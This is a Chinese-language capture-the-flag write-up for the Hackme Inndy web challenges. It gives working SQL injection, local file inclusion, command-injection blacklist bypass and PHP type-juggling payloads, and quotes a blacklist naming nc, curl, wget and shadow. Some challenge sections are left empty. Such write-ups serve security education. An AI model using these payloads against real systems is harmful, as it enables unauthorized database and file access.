Hackme Inndy CTF
===

參賽者：Will

## Web
### 0x01 hide and seek
#### https://hackme.inndy.tw/

看網站原始碼並尋找 `FLAG{` 

![](https://i.imgur.com/Vm6Xy2E.png)



### 0x02 guestbook
#### https://hackme.inndy.tw/gb/

**Payload 1:** 取得資料庫名 g8

`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,database(),4#`

**Payload 2:** 得到資料庫表名 flag

`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='g8' limit 0,1),4#`

**Payload 3:** 得到資料庫列名 flag

`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='flag' limit 1,1),4#`

**Payload 4:** 拿到該題 `flag`

`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select flag from flag limit 1,1),4#`



### 0x03 LFI
#### https://hackme.inndy.tw/lfi/?page=pages/index

**Payload 1:**

`https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag`

base64 decode 後得到 flag.php

``` php
Can you read the flag<?php require('config.php'); ?>?
```

**Payload 2:**

`https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config`

base64 decode 後得到 config.php

``` php
<?php

$flag = "FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}";
```



### 0x04 homepage
#### https://hackme.inndy.tw/

查看原始碼得知 [cute.js](https://hackme.inndy.tw/cute.js)

aaencode 解碼後得到 js 原始碼

在 Firefox Console 執行得到 QR Code 掃描後得到 flag

![](https://i.imgur.com/eHkN7wF.png)



### 0x05 ping
#### https://hackme.inndy.tw/ping/

有一串黑名單陣列, 發現 `sort` 沒防護到

``` php
$blacklist = [
            'flag', 'cat', 'nc', 'sh', 'cp', 'touch', 'mv', 'rm', 'ps', 'top', 'sleep', 'sed',
            'apt', 'yum', 'curl', 'wget', 'perl', 'python', 'zip', 'tar', 'php', 'ruby', 'kill',
            'passwd', 'shadow', 'root', 'z',
            'dir', 'dd', 'df', 'du', 'free', 'tempfile', 'touch', 'tee', 'sha', 'x64', 'g',
            'xargs', 'PATH',
            '$0', 'proc',
            '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
        ];
```

**Payload:**

`sort fl????hp`





### 0x06 scoreboard
#### https://hackme.inndy.tw/scoreboard/

**Payload:** X-Flag 就是 flag

`curl -I https://hackme.inndy.tw/scoreboard/`



### 0x07 login as admin 0
#### https://hackme.inndy.tw/login0/

過濾可以知道 `'` 會被取代成 `\\'`, 因此 `\'` 可以濾過

``` javascript
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```

**Payload 1:** 得到 guest

``` 
username = \' || 1#
password = 1
```

**Payload 2:** 得到 admin & flag

``` 
username = \' || 1 limit 1,1#
password = 1
```


### 0x08 login as admin 0.1
#### https://hackme.inndy.tw/login0/
**Payload 1:** 2 會有反應

``` 
username = \' union select 1,2,3,4#
password = 1
```

**Payload 2:** 得到資料庫為 `login_as_admin0`

``` 
username = \' union select 1,database(),3,4#
password = 1
```

**Payload 3:** 得到資料庫表名 `h1dden_f14g`

```
username = \' union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),3,4#
password = 1
```

**Payload 4:** 得到資料庫列名 `the_f14g`

```
username = \' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x68316464656e5f66313467 limit 0,1),3,4#
password = 1
```

**Payload 5:** 得到 flag

```
username = \' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#
password = 1
```



### 0x09 login as admin 1
#### https://hackme.inndy.tw/login1/
這邊會把空白變成空值, 但可以使用 `/**/` 代替空白

再使用 0x07 的 Payload 達成攻擊

``` php
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, ' ') || strstr($strl, '1=1') || strstr($strl, "''") ||
        strstr($strl, 'union select') || strstr($strl, 'select ')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```

**Payload:** 
```
username = \'/**/||1/**/limit/**/1,1#
password = 1
```

### 0x10 login as admin 1.2 
#### https://hackme.inndy.tw/login1/

### 0x11 login as admin 3
#### https://hackme.inndy.tw/login3/

### 0x12 login as admin 4
#### https://hackme.inndy.tw/login4/

<弱邏輯>只要 name 是 admin 就會印出 flag

``` html 
<?php if($_POST['name'] === 'admin'): /* login success! */ ?>
            <div class="alert alert-success"><code><?=$flag?></code></div>
```

**Payload:**

`curl -d "name=admin" https://hackme.inndy.tw/login4/`



### 0x13 login as admin 6


### 0x14 login as admin 7
#### https://hackme.inndy.tw/login7/

在 php 裡 `==` 是比較運算且密碼是使用 md5 加密, 只要找到加密結果是 0e 開頭和後面全是數字的結果即可通過。

``` html
if($_POST['name'] == 'admin' && md5($_POST['password']) == '00000000000000000000000000000000') {
    // admin account is disabled by give a impossible md5 hash
    $user = 'admin';
} elseif($_POST['name'] == 'guest' && md5($_POST['password']) == '084e0343a0486ff05530df6c705c8bb4') {
    $user = 'guest';
} elseif(isset($_POST['name'])) {
    $user = false;
}
```


**Payload:**
``` sh
username = admin
password = QNKCDZO
```